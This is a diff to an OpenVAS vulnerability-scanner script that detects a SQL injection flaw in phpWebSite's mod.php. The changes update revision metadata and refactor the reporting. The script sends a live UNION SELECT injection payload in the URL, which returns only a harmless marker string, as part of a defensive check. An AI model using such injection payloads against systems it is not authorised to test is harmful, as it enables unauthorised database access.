@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_phpwebsite_49354.nasl 3102 2016-04-18 14:46:07Z benallard $
+# $Id: gb_phpwebsite_49354.nasl 5750 2017-03-28 14:10:17Z cfi $
 #
 # phpWebSite 'mod.php' SQL Injection Vulnerability
 #
@@ -32,12 +32,11 @@ A successful exploit may allow an attacker to compromise the
 application, access or modify data, or exploit latent vulnerabilities
 in the underlying database.";
 
-
-if (description)
+if(description)
 {
  script_id(103234);
- script_version("$Revision: 3102 $");
- script_tag(name:"last_modification", value:"$Date: 2016-04-18 16:46:07 +0200 (Mon, 18 Apr 2016) $");
+ script_version("$Revision: 5750 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 16:10:17 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-08-30 14:29:55 +0200 (Tue, 30 Aug 2011)");
  script_bugtraq_id(49354);
  script_tag(name:"cvss_base", value:"7.5");
@@ -50,7 +49,6 @@ if (description)
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/519456");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if phpWebSite is prone to an SQL-injection vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -64,26 +62,20 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list(cgi_dirs());
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
-  url = string(dir,"/mod.php?mod=publisher&op=allmedia&artid=-1%20union%20select%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374"); 
+  if( dir == "/" ) dir = "";
+  url = string(dir,"/mod.php?mod=publisher&op=allmedia&artid=-1%20union%20select%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374");
 
   if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
-     
-    security_message(port:port);
-    exit(0);
-
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-exit(0);
+exit( 99 );
